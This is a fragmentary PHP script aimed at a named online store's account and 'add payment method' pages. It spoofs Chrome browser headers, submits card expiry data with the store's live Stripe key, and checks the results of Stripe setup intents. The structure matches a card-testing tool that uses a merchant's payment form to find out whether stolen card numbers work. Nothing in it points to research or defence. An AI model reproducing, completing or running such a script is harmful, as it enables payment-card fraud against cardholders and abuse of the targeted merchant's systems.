...
$get_url = "https://huehd.com/my-account/";
...
$create_url = "https://huehd.com/my-account/";
...
$create_headers = [
    ...
    "origin: https://huehd.com",
    "priority: u=0, i",
    "referer: https://huehd.com/my-account/",
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile: ?0",
    'sec-ch-ua-platform: "Windows"',
    "sec-fetch-dest: document",
...
$pay_url = "https://huehd.com/my-account/add-payment-method/";
...
$pay_headers = [
    ...
    "accept-language: en-US,en;q=0.9",
    "priority: u=0, i",
    "referer: https://huehd.com/my-account/add-payment-method/",
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile: ?0",
    'sec-ch-ua-platform: "Windows"',
    "sec-fetch-dest: document",
...
$st_payload = http_build_query([
    ...
    "card[exp_month]" => $mm,
    "card[exp_year]" => $yy,
    "referrer" => "https://huehd.com",
    "key" => "pk_live_516OSFxDJHEIwqvlcwJuNP7F4qm0NC60ka87Q47bgrUBOfptChoDXYtMmoIEHmuJAns9fbucelW1WIrJVGSIyUJ9g00X384dFW1"
]);
...
$cseti_url = "https://huehd.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent";
...
if ($securestate === 'requires_action') {
    ...
    if (($state == "succeeded") || ($state == "attempted") || ($state == "processing_error")){
        ...
        $get_url = "https://api.stripe.com/v1/setup_intents/{$cintent}?is_stripe_sdk=false&client_secret={$csecret}&key=pk_live_516OSFxDJHEIwqvlcwJuNP7F4qm0NC60ka87Q47bgrUBOfptChoDXYtMmoIEHmuJAns9fbucelW1WIrJVGSIyUJ9g00X384dFW1";
